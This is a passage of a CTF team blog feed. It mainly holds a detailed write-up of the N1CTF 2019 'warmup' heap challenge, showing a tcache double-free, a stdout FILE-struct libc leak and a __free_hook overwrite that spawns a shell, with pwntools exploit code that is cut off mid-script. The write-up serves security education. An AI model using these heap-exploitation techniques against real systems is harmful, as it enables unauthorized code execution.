class="line">r.interactive()</span><br><span class="line">r.close() <span class="comment">#</span></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;popping_caps&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;350&lt;/p&gt;
&lt;p&gt;You ever wonder why cowboys have 
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="Tcache" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/"/>
    
      <category term="tcache_perthread_struct" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-perthread-struct/"/>
    
      <category term="House of Spirit" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/House-of-Spirit/"/>
    
    
      <category term="heap" scheme="https://teamrocketist.github.io/tags/heap/"/>
    
      <category term="house_of_spirit" scheme="https://teamrocketist.github.io/tags/house-of-spirit/"/>
    
      <category term="csaw2019" scheme="https://teamrocketist.github.io/tags/csaw2019/"/>
    
      <category term="tcache_perthread_struct" scheme="https://teamrocketist.github.io/tags/tcache-perthread-struct/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] N1CTF 2019 - warmup</title>
    <link href="https://teamrocketist.github.io/2019/09/09/Pwn-N1CTF-2019-warmup/"/>
    <id>https://teamrocketist.github.io/2019/09/09/Pwn-N1CTF-2019-warmup/</id>
    <published>2019-09-09T00:51:13.000Z</published>
    <updated>2019-09-16T01:27:50.379Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>warmup</p></blockquote><blockquote><p><strong>Description</strong>:<br>192</p><p>Solvers 43</p><p>attachment：<a href="https://share.weiyun.com/5NiPNJA" target="_blank" rel="noopener">https://share.weiyun.com/5NiPNJA</a> password：ryzwab</p><p>or</p><p><a href="https://drive.google.com/file/d/14ablm3PSKd1q0RDQUt4rZa-FCy7_wCSo/view?usp=sharing" target="_blank" rel="noopener">https://drive.google.com/file/d/14ablm3PSKd1q0RDQUt4rZa-FCy7_wCSo/view?usp=sharing</a></p><p>nc 47.52.90.3 9999</p></blockquote><h3 id="Info-extracting"><a href="#Info-extracting" class="headerlink" title="Info extracting"></a>Info extracting</h3><p>Binary and libc-2.27.so is given, since is <strong>2.27</strong> version we know that tcache is being used and on this version there isn’t any security checks if a chunk is placed in tcache bin.</p><p>First we start by using the <strong>file</strong> command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file warmup</span><br><span class="line">warmup: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=8b691053c73440b1f889e70408fa631d2a34c6f3, stripped</span><br></pre></td></tr></table></figure><p>With this we know:</p><ul><li>ELF compiled for x86_x64 architecture.</li><li>Dynamically linked.</li><li>Stripped (A little bit harder to reverse).</li></ul><p>Next step is to check protections:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checksec warmup</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/warmup/warmup'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>Brief analysis of these protections:</p><ul><li>FULL RELRO (<strong>GOT</strong> entries are read only we can’t overwrite them)</li><li>STACK CANARY (The stack is protected with the canary if there is a stack overflow we need to find a way to <strong>leak</strong> it)</li><li>The Stack is not executable (We can’t execute shellcode, techniques like <strong>ROP</strong> can bypass this)</li><li>PIE (Position Independent Executable) is on (If we want to use rop we need a way to leak the base address)</li></ul><h3 id="Testing-the-binary"><a href="#Testing-the-binary" class="headerlink" title="Testing the binary"></a>Testing the binary</h3><p>As always for this kind of challenges we are presented with a menu:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ ./warmup </span><br><span class="line">Loading......</span><br><span class="line"><span class="comment">#     #    #     #####  ####### #######</span></span><br><span class="line"><span class="comment">##    #   ##    #     #    #    #</span></span><br><span class="line"><span class="comment"># #   #  # #    #          #    #</span></span><br><span class="line"><span class="comment">#  #  #    #    #          #    #####</span></span><br><span class="line"><span class="comment">#   # #    #    #          #    #</span></span><br><span class="line"><span class="comment">#    ##    #    #     #    #    #</span></span><br><span class="line"><span class="comment">#     #  #####   #####     #    #</span></span><br><span class="line">===========================================</span><br><span class="line">1.add.</span><br><span class="line">2.delete.</span><br><span class="line">3.modify.</span><br><span class="line">4.exit.</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure><p>We can add, delete and modify.</p><p>By adding we can only specify the content:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#     #    #     #####  ####### #######</span></span><br><span class="line"><span class="comment">##    #   ##    #     #    #    #</span></span><br><span class="line"><span class="comment"># #   #  # #    #          #    #</span></span><br><span class="line"><span class="comment">#  #  #    #    #          #    #####</span></span><br><span class="line"><span class="comment">#   # #    #    #          #    #</span></span><br><span class="line"><span class="comment">#    ##    #    #     #    #    #</span></span><br><span class="line"><span class="comment">#     #  #####   #####     #    #</span></span><br><span class="line">===========================================</span><br><span class="line">1.add.</span><br><span class="line">2.delete.</span><br><span class="line">3.modify.</span><br><span class="line">4.exit.</span><br><span class="line">&gt;&gt;1</span><br><span class="line">content&gt;&gt;hello</span><br><span class="line"><span class="keyword">done</span>!</span><br></pre></td></tr></table></figure><p>For delete and edit we can both specify a index in case of modify we can also modify the content we previously added on creation.</p><h3 id="Static-analysis-with-IDA"><a href="#Static-analysis-with-IDA" class="headerlink" title="Static analysis with IDA"></a>Static analysis with IDA</h3><p>Analysis of delete function<br><a data-fancybox="gallery" href="https://i.imgur.com/S5DOdKD.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/S5DOdKD.png" alt><br></a><br>Analysis of add function<br><a data-fancybox="gallery" href="https://i.imgur.com/KXD81t2.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KXD81t2.png" alt><br></a><br>Analysis of edit function<br><a data-fancybox="gallery" href="https://i.imgur.com/IOQyTRp.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/IOQyTRp.png" alt><br></a></p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>As you have noticed we don’t have any <strong>read/print</strong> function that would allow us to print the contents of the created items because of this we need to find another way to leak a libc address, we can do it by manipulation the <strong>IO_FILE struct</strong> to make <strong>puts</strong> leaking an address.</p><p>The plan is:</p><ul><li>Use tcache dup to overwrite the size of a chunk into a size of unsorted bin range (0x91 for example)</li><li>Fill the tcachebin size 0x91 by freeing it 7 times (max 7)</li><li>One more free will put this chunk into an unsorted bin both <strong>fd</strong> and <strong>bk</strong> are updated into libc addresses from the main arena.</li><li>Do a 4 bit brute force by updating the last 2 bytes of the <strong>fd</strong> libc address to get stdout.</li><li>Resize from 0x91 back to 0x51 so next free gets into a tcache bin again.</li><li>Overwrite <strong>stdout-&gt;_flags</strong> with 0xfbad1800 and <strong>_IO_read_ptr</strong>, <strong>_IO_read_end</strong>, <strong>_IO_read_base</strong> with NULL and the last byte of <strong>_IO_write_base</strong> with NULL.</li><li>Extract libc addresses from next puts.</li><li>Overwrite free_hook with system and modify its fd to <strong>/bin/sh\x00</strong>, Doing a free will get a shell for us.</li></ul><h3 id="Tcache-dup"><a href="#Tcache-dup" class="headerlink" title="Tcache dup"></a>Tcache dup</h3><p>Libc-2.27 uses tcache so every allocated chunk bellow 0x410 when freed is placed in a tcachebin , their behaviour will be very similar to when they were inserted in a fastbin chunk before tcache was introduced. The main problem is we can only allocate 0x40 chunks (0x51 -&gt; size + flags) for example if we allocate one item this is how it looks like in the heap:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/r4PaEa6.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/r4PaEa6.png" alt><br></a></p><p>In order to transform the chunk above into a chunk in range of a unsorted bin(unsorted bin because after a free it will update <strong>fd</strong> <strong>bk</strong> pointers into libc addresses) we kinda need an arbitrary write. </p><p>This can be achieved with double free and by changing the <strong>fd</strong> pointer into a place we want to write, when malloc executes it will return the modified <strong> fd</strong> pointer in our case we want it to be right at the chunk header (0x5595b74c0660) so we can modify the size from 0x51 to 0x91.</p><p>Imagine after chunk A we allocate more 2 chunks B and C, if we free B first, <strong>free</strong> will check if there is any chunk inside tcachebin of size 0x50:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/guHHuxk.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/guHHuxk.png" alt><br></a></p><p>As you can see above there isn’t any list of size 0x50 so it will update the <strong>fd</strong> of the chunk to null.</p><p>Chunk B before free:<br><a data-fancybox="gallery" href="https://i.imgur.com/jFbSiXq.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/jFbSiXq.png" alt><br></a></p><p>Chunk B after free:<br><a data-fancybox="gallery" href="https://i.imgur.com/iFBwQui.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/iFBwQui.png" alt><br></a></p><p>The pointer to the current freed chunk is inserted into tcachebin(0x50) at the head:<br><a data-fancybox="gallery" href="https://i.imgur.com/0mVFp0g.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/0mVFp0g.png" alt><br></a></p><p>If we free chunk C now its <strong>fd</strong> is updated to chunk B pointer:<br><a data-fancybox="gallery" href="https://i.imgur.com/r6HICoF.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/r6HICoF.png" alt><br></a></p><p>And the current freed chunk pointer is inserted at the head of tcachebin(0x50):<br><a data-fancybox="gallery" href="https://i.imgur.com/R0w8x74.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/R0w8x74.png" alt><br></a></p><p>Now if we free Chunk A its <strong>fd</strong> is going to point to chunk C:<br><a data-fancybox="gallery" href="https://i.imgur.com/WICM2Kk.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/WICM2Kk.png" alt><br></a></p><p>Chunks A content pointer is added to the tcachebin(0x50) linked list:<br><a data-fancybox="gallery" href="https://i.imgur.com/aJMDK2Z.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/aJMDK2Z.png" alt><br></a></p><p>If we double free Chunk A its <strong>fd</strong> is going to point to its own because the previous freed as chunk A:<br><a data-fancybox="gallery" href="https://i.imgur.com/XVLjjNX.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/XVLjjNX.png" alt><br></a></p><p>Chunks A content pointer is added to tcachebin(0x50):<br><a data-fancybox="gallery" href="https://i.imgur.com/BvNV320.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/BvNV320.png" alt><br></a></p><p>Notice that ALSR doesn’t modify the last 3 numbers of the pointers of each chunk on the heap:<br><a data-fancybox="gallery" href="https://i.imgur.com/9a5RUBi.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/9a5RUBi.png" alt><br></a></p><p>The reason why there is a tcachebin is to reuse space on the heap when a new chunk is allocated, if it’s a perfect fit for example malloc will look at the list of that size and reposition the new allocated chunk on the same places where old chunks were freed. And this is why double freeing is so powerful, since one of the pointers is repeated in the list if we allocate one and modify the last byte of the <strong>fd</strong> to 0x60 we can make the next malloc to return to the <strong>fd</strong> we want getting an arbitrary write.</p><p>So this is how the exploit looks like right now:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    r = getConn()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">        debug([<span class="number">0xBFB</span>,<span class="number">0xD25</span>]) <span class="comment"># add BFB free 0xD25</span></span><br><span class="line"></span><br><span class="line">    add(<span class="string">'A'</span>*<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="string">'B'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>)) <span class="comment"># TO PREVENT double free or corruption (!prev) 1</span></span><br><span class="line">    add(<span class="string">'C'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+p64(<span class="number">0x01</span>)) <span class="comment"># TO PREVENT corrupted size vs. prev_size 2</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>The tcache bin list right now is:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x50 [4]: 0x56018d3ae670 -&gt; 0x56018d3ae670</span><br></pre></td></tr></table></figure></p><p>If we do this mallocs:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0x50 [4]: 0x56018d3ae670 -&gt; 0x56018d3ae670</span></span><br><span class="line">add(<span class="string">'\x70'</span>) <span class="comment"># malloc will return 0x56018d3ae670 and updates last byte of fd to 0x70 | Index 0</span></span><br><span class="line"><span class="comment"># 0x50 [3]: 0x56018d3ae670 -&gt; 0x56018d3ae670</span></span><br><span class="line">add(<span class="string">'\x60'</span>) <span class="comment"># malloc will return 0x56018d3ae670 and updates last byte of fd to 0x60 | Index 1</span></span><br><span class="line"><span class="comment"># 0x50 [2]: 0x56018d3ae670 -&gt; 0x56018d3ae660</span></span><br><span class="line">add(<span class="string">'\x60'</span>) <span class="comment"># malloc will return 0x56018d3ae670 and updates last byte of fd to 0x60 | Index 2</span></span><br><span class="line"><span class="comment"># 0x50 [1]: 0x56018d3ae660</span></span><br><span class="line">add(p64(<span class="number">0x0</span>)) <span class="comment"># malloc will return 0x56018d3ae660 | Index 3</span></span><br></pre></td></tr></table></figure><p>After this if we edit index 3:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0</span>) <span class="comment"># 0x50 [  1]: 0x56018d3ae670 &lt;- 0x0</span></span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># 0x50 [  2]: 0x56018d3ae670 &lt;- 0x56018d3ae670</span></span><br><span class="line">edit(<span class="number">3</span>, p64(<span class="number">0x0</span>)+p64(<span class="number">0x91</span>)) <span class="comment"># modifies the header of chunk A from p64(0x0)+p64(0x51) to p64(0x0)+p64(0x91)</span></span><br></pre></td></tr></table></figure><p>The look of chunk A in GDB after edit:<br><a data-fancybox="gallery" href="https://i.imgur.com/6liWVaM.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/6liWVaM.png" alt><br></a></p><p>Now that we have a 0x91 chunk we need to fill tcachebin of 0x91, we can do this by freeing it 7 times:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">7</span>):</span><br><span class="line">    free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>The look at tcachebins after this:<br><a data-fancybox="gallery" href="https://i.imgur.com/UGdrV7l.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/UGdrV7l.png" alt><br></a></p><p>Next <strong>free(1)</strong> the chunk is going to be inserted into an unsortedbin:<br><a data-fancybox="gallery" href="https://i.imgur.com/aioqaqu.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/aioqaqu.png" alt><br></a></p><p>The reason for an unsortedbin is because both <strong>fd</strong> and <strong>bk</strong> will be updated into libc addresses:<br><a data-fancybox="gallery" href="https://i.imgur.com/OZcxQBy.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/OZcxQBy.png" alt><br></a></p><p>The reasons why I created chunk B and C was to be able to free this chunk, because tcache is full next free will have security checks, on my old write up of penpal world I did the same thing and I explained why chunk B and C bypass this checks you can find it at <a href="https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/">https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/</a></p><p>The first thing we want to do now is to convert this bin again back to 0x51 size we still have its pointer saved at index 3 so we can easily do it with:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">3</span>, p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>))</span><br></pre></td></tr></table></figure><p>We want to do this because tcachebin(0x91) is <strong>full</strong> , we want to manipulate tcachebins again, since we already double freed before at tcachebin(0x50). </p><p>The other reason is that we can <strong>only</strong> malloc chunks of size 0x51.</p><p>Lets compare the difference of stdout address and the address that got placed at the <strong>fd</strong> .</p><p>Stdout address:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x stdout</span><br><span class="line"><span class="variable">$3</span> = 0x7f8421047760</span><br></pre></td></tr></table></figure></p><p><strong>fd</strong> pointer at chunk A:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x56018d3ae660+0x10</span><br><span class="line">0x56018d3ae670: 0x00007f8421046ca0      0x00007f8421046ca0</span><br></pre></td></tr></table></figure><p>We want to modify <strong>0x7f8421046ca0</strong> to <strong>0x7f8421047760</strong> we only need to change the last 2 bytes, we know that the last 3 numbers of stdout never change(670), they are always the same, so the only thing we need to brute force is the 4th this means if we try to modify the last two bytes of the <strong>fd</strong> to p16(0x7760) we would have a probability of 1/16 because the only possibilities for <strong>last bytes</strong> of stdout are:</p><blockquote>0760<br>1760<br>2760<br>3760<br>4760<br>5760<br>6760<br>7760<br>8760<br>9760<br>a760<br>b760<br>c760<br>d760<br>e760<br>f760<br></blockquote><p>This is the look of tcachebins right now:<br><a data-fancybox="gallery" href="https://i.imgur.com/EfA29yV.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/EfA29yV.png" alt><br></a></p><p>So on our second malloc, the pointer returned will be the libc address but before that we need to modify the last 2 bytes from one of the 16 possibilities:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>, p16(<span class="number">0x7760</span>))</span><br></pre></td></tr></table></figure><p>Now if we succeed to bruteforce stdout we need to overwrite <strong>stdout-&gt;_flags</strong> with 0xfbad1800 and <strong>_IO_read_ptr</strong>, <strong>_IO_read_end</strong>, <strong>_IO_read_base</strong> with NULL and the last byte of <strong>_IO_write_base</strong> with NULL, if we do this next puts will leak a bunch of libc addresses a more detailed explanation on why this works can be found at <a href="https://vigneshsrao.github.io/babytcache/" target="_blank" rel="noopener">https://vigneshsrao.github.io/babytcache/</a> this guy explains it very well.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'A'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    add(p64(<span class="number">0x0fbad1800</span>)+ <span class="number">3</span>*p64(<span class="number">0</span>) + <span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">    r.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure></p><p>if we succeed something like this is printed to the screen where we can see a lot of libc addresses leaked there:<br><a data-fancybox="gallery" href="https://i.imgur.com/Axh5NYh.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Axh5NYh.png" alt><br></a></p><p>Now adapting a bit more our code to make sure we got libc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">r.recv(<span class="number">0x8</span>)</span><br><span class="line">leak = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = leak<span class="number">-0x3ed8b0</span></span><br><span class="line">SYSTEM = LIBC + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">FREE_HOOK = LIBC + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">MALLOC_HOOK = LIBC + libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"><span class="keyword">if</span> LIBC &gt;&gt; <span class="number">40</span> != <span class="number">0x7f</span> <span class="keyword">or</span> LIBC &amp; <span class="number">0xFFF</span> != <span class="number">0</span>:</span><br><span class="line">    log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">    r.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">log.success(<span class="string">"0x%x"</span>%leak)</span><br><span class="line">log.success(<span class="string">"LIBC: 0x%x"</span> % LIBC)</span><br><span class="line">log.success(<span class="string">"SYSTEM: 0x%x"</span> % SYSTEM)</span><br><span class="line">log.success(<span class="string">"FREE_HOOK: 0x%x"</span> % FREE_HOOK)</span><br></pre></td></tr></table></figure><p>In the end, we have everything we need modify the <strong>fd</strong> of the object you want to free with /bin/sh and overwrite free_hook with system so next time we trigger free we get a shell!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)) <span class="comment"># 0</span></span><br><span class="line">edit(<span class="number">0</span>,p64(FREE_HOOK))</span><br><span class="line">add(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)) <span class="comment"># 1</span></span><br><span class="line">add(p64(SYSTEM)) <span class="comment"># 4</span></span><br><span class="line">    </span><br><span class="line">edit(<span class="number">2</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>Full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"47.52.90.3"</span>, <span class="string">"9999"</span></span><br><span class="line">filename = <span class="string">"./warmup"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    <span class="comment">#script += "b * 0x%x\n"%(LIBC+)</span></span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.sendafter(<span 